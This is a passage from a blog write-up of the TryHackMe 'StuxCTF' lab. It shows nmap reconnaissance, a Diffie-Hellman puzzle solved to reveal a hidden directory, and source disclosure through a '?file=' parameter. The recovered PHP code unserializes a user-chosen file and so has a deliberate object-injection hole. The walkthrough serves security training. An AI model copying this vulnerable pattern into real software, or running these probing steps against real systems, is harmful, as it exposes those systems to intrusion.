<!doctype html><html lang=en>
<head>
<title>
StuxCTF - Write Up ::
Lanfran02 - Blog — Where write-ups are made.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Level Creator     Here Medium stuxnet    Reconn Here we go with our best friend nmap
└──╼ $map stuxctf.thm [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 17:18 CEST Nmap scan report for stuxctf.thm Host is up (0.064s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/posts/stuxctf/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/posts/stuxctf/cover.png">
<meta name=twitter:title content="StuxCTF - Write Up">
<meta name=twitter:description content="TryHackMe's medium level machine.">
<meta property="og:title" content="StuxCTF - Write Up">
<meta property="og:description" content="TryHackMe's medium level machine.">
<meta property="og:type" content="article">
<meta property="og:url" content="/posts/stuxctf/"><meta property="og:image" content="/posts/stuxctf/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-06T12:52:17+02:00">
<meta property="article:modified_time" content="2021-07-06T12:52:17+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/es/>Español</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/tags/hackthebox/>HTB</a></li>
<li><a href=/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/es/>Español</a></li>
<li><a href=/tags/hackthebox/>HTB</a></li>
<li><a href=/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>StuxCTF - Write Up</h1>
<div class=post-meta>
<span class=post-date>
2021-07-06
</span>
<span class=post-author>— Written by Lanfran02</span>
<span class=post-read-time>— 6 min read</span>
</div>
<span class=post-tags>
<a href=/tags/nc/>#nc</a>&nbsp;
<a href=/tags/unserialize/>#unserialize</a>&nbsp;
<a href=/tags/crypto/>#crypto</a>&nbsp;
<a href=/tags/sudo/>#sudo</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/posts/stuxctf/cover.png alt="StuxCTF - Write Up">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconn>Reconn</a></li>
<li><a href=#foothold---user>Foothold - User</a></li>
<li><a href=#root>Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Level</th>
<th>Creator</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/stuxctf>Here</a></td>
<td>Medium</td>
<td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td>
</tr>
</tbody>
</table>
<h2 id=reconn>Reconn</h2>
<p>Here we go with our best friend <code>nmap</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└──╼ $map stuxctf.thm
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-06-16 17:18 CEST
Nmap scan report <span style=color:#66d9ef>for</span> stuxctf.thm
Host is up <span style=color:#f92672>(</span>0.064s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
| http-robots.txt: <span style=color:#ae81ff>1</span> disallowed entry 
|_/StuxCTF/
|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Default Page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>(I added the IP of the machine to my /etc/hosts file, you can also do it with this code)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo echo <span style=color:#e6db74>&#34;ip_machine stuxctf.thm&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>So, we have a web server running on port 80. Let&rsquo;s use <code>curl</code> to check it out.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Default Page&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;!-- The secret directory is...
		p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
		g: 7;
		a: 330;
		b: 450;
		g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
		--&gt;
		is blank....
	&lt;/body&gt;
&lt;/html&gt;

</code></pre></div><p>Mmmm interesting. Let&rsquo;s see what the <code>robots.txt</code> has.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm/robots.txt
<span style=color:#75715e># robots.txt generated by StuxCTF</span>
<span style=color:#75715e># Diffie-Hellman</span>
User-agent: *
Disallow: 
Disallow: /StuxCTF/
</code></pre></div><p>Okay, we have a directory (spoiler: it doesn&rsquo;t exists&mldr;) and a hint &ldquo;Diffie-Hellman&rdquo;&mldr;</p>
<p>Let&rsquo;s read the hint on the CTF&rsquo;s page:</p>
<pre><code>What is the hidden directory?

HINT: g ^ a mod p, g ^ b mod p, g ^ C mod p

first 128 characters ... 
</code></pre><p>So googling &ldquo;g^a mod p, g^b mod p, g^c mod p&rdquo; we found 2 things:</p>
<ul>
<li>The creator of this rooms is using a Diffie-Hellman encryption.</li>
<li><a href=https://razzk.net/posts/Crypto-300_1/>A writeup of a &ldquo;QIWI - Crypto 300_1&rdquo; lab, with a python code to decrypt the message.</a></li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env sage -python</span>

p<span style=color:#f92672>=</span>XXXXXXX
g<span style=color:#f92672>=</span>X
a<span style=color:#f92672>=</span>XXX
b<span style=color:#f92672>=</span>XXXX
gc<span style=color:#f92672>=</span>XXXXXXXX

gca <span style=color:#f92672>=</span> (gc<span style=color:#f92672>**</span>a) <span style=color:#f92672>%</span> p
gcab <span style=color:#f92672>=</span> (gca<span style=color:#f92672>**</span>b) <span style=color:#f92672>%</span> p

print <span style=color:#e6db74>&#34;flag: &#34;</span>, str(gcab)[:<span style=color:#ae81ff>20</span>]
</code></pre></div><p>Let&rsquo;s edit to to work with our numbers.</p>
<p><img src=Directory.png alt=Directory></p>
<p>Good! We have now the hidden directory, so let&rsquo;s navigate to it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm/4731502893726489553913132817<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>77039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/
&lt;!DOCTYPE html&gt;
    &lt;head&gt;
        &lt;title&gt;StuxCTF&lt;/title&gt;
	&lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
        &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
        &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/css/bootstrap.min.css&#34;</span> /&gt;
        &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/css/style.css&#34;</span> /&gt;
    &lt;/head&gt;
        &lt;body&gt;
        &lt;nav class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar navbar-default navbar-fixed-top&#34;</span>&gt;
          &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
            &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-header&#34;</span>&gt;
              &lt;button type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-toggle collapsed&#34;</span> data-toggle<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;collapse&#34;</span> data-target<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#navbar&#34;</span> aria-expanded<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;false&#34;</span> aria-controls<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar&#34;</span>&gt;
                &lt;span class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sr-only&#34;</span>&gt;Toggle navigation&lt;/span&gt;
              &lt;/button&gt;
              &lt;a class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-brand&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;index.php&#34;</span>&gt;Home&lt;/a&gt;
            &lt;/div&gt;
          &lt;/div&gt;
        &lt;/nav&gt;
        &lt;!-- hint: /?file<span style=color:#f92672>=</span> --&gt;
        &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
            &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jumbotron&#34;</span>&gt;
				&lt;center&gt;
					&lt;h1&gt;Follow the white rabbit..&lt;/h1&gt;
				&lt;/center&gt;
            &lt;/div&gt;
        &lt;/div&gt;            
        &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/jquery-1.11.3.min.js&#34;</span>&gt;&lt;/script&gt;
        &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>Hmmm, we have a index saying &ldquo;<em>Follow the white rabbit..</em>&rdquo;
And also a hidden hint: <code>&lt;!-- hint: /?file= --></code></p>
<p>So maybe the PHP page it&rsquo;s waiting for the GET parameter &ldquo;file&rdquo; ??</p>
<p>It was tricky, because I tried with <code>etc/paswd</code> | apache logs | and every commoon directory, but nothing worked, so I tried with the <code>index.php</code> itself and it worked!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://10.10.250.63/47315028937264895539131328176684350732<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>202704977050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>index.php
3d3d67432b384349794a47502b7757623068324c386f67507641696369786a50355232626939435067414349676f67507641696369786a5030425861794e326376776a50694d6e617534576174354363684a48647a523362764a324c7a70324c7a52585a7a4e585969307a59794e484930425861794e32633841434967414349674143494b347a4c67496e5938344464776c6d636a4e334c38346a497a706d4c756c5762754d6a4c78456a4c78305365795657647870324c7a70324c7a52585a7a4e585969307a59794e484930425861794e32633841434967414349674143494b347a4c67496e593841434967414349674143496741434967346a647052324c3841434967414349674143494b347a4c67496e5938346a647052324c38414349674143496741434967414349676f67507641696369786a507956476475563259767754434a6b51434b347a4c67496e593834544d6f39435075344364704a6d59684a48496c5258616f6448496c68476467633362737832624735544d6f7854434a6b51434a6f67507641696369786a5079564764<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>79396d6379566d432b384349794a4750&lt;!DOCTYPE html&gt;
    &lt;head&gt;
        &lt;title&gt;StuxCTF&lt;/title&gt;
	&lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
        &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
        &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/css/bootstrap.min.css&#34;</span> /&gt;
        &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/css/style.css&#34;</span> /&gt;
    &lt;/head&gt;
        &lt;body&gt;
        &lt;nav class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar navbar-default navbar-fixed-top&#34;</span>&gt;
          &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
            &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-header&#34;</span>&gt;
              &lt;button type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-toggle collapsed&#34;</span> data-toggle<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;collapse&#34;</span> data-target<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#navbar&#34;</span> aria-expanded<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;false&#34;</span> aria-controls<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar&#34;</span>&gt;
                &lt;span class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sr-only&#34;</span>&gt;Toggle navigation&lt;/span&gt;
              &lt;/button&gt;
              &lt;a class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-brand&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;index.php&#34;</span>&gt;Home&lt;/a&gt;
            &lt;/div&gt;
          &lt;/div&gt;
        &lt;/nav&gt;
        &lt;!-- hint: /?file<span style=color:#f92672>=</span> --&gt;
        &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
            &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jumbotron&#34;</span>&gt;
				&lt;center&gt;
					&lt;h1&gt;Follow the white rabbit..&lt;/h1&gt;
				&lt;/center&gt;
            &lt;/div&gt;
        &lt;/div&gt;            
        &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/jquery-1.11.3.min.js&#34;</span>&gt;&lt;/script&gt;
        &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>It returned a looong encoded text!</p>
<p>I used <a href=https://tinyurl.com/5fu8tzc9>this cyberchef recipe</a> to decode it.</p>
<p>And we get the php code of the index.php file!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>file</span> {<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#66d9ef>public</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dump.txt&#34;</span>;<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#66d9ef>public</span> $data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dump test&#34;</span>;<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#66d9ef>function</span> __destruct(){<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
                <span style=color:#a6e22e>file_put_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>);<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        }<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
}<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
$file_name <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;file&#39;</span>];<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($file_name) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>($file_name)){<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File no Exist!&#34;</span>;<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
}<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#66d9ef>if</span>($file_name<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;index.php&#34;</span>){<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        $content <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($file_name);<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        $tags <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>);<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>bin2hex</span>(<span style=color:#a6e22e>strrev</span>(<span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>nl2br</span>(<span style=color:#a6e22e>str_replace</span>($tags, <span style=color:#e6db74>&#34;&#34;</span>, $content)))));<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
}<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#a6e22e>unserialize</span>(<span style=color:#a6e22e>file_get_contents</span>($file_name));<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>DOCTYPE</span> <span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
    <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>title</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>StuxCTF</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>title</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
	<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/css/bootstrap.min.css&#34;</span> <span style=color:#f92672>/&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/css/style.css&#34;</span> <span style=color:#f92672>/&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
    <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>nav</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar navbar-default navbar-fixed-top&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
          <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-header&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
              <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-toggle collapsed&#34;</span> <span style=color:#a6e22e>data</span><span style=color:#f92672>-</span><span style=color:#a6e22e>toggle</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;collapse&#34;</span> <span style=color:#a6e22e>data</span><span style=color:#f92672>-</span><span style=color:#a6e22e>target</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#navbar&#34;</span> <span style=color:#a6e22e>aria</span><span style=color:#f92672>-</span><span style=color:#a6e22e>expanded</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;false&#34;</span> <span style=color:#a6e22e>aria</span><span style=color:#f92672>-</span><span style=color:#a6e22e>controls</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
                <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>span</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sr-only&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Toggle</span> <span style=color:#a6e22e>navigation</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>span</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
              <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>button</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
              <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>a</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar-brand&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;index.php&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Home</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
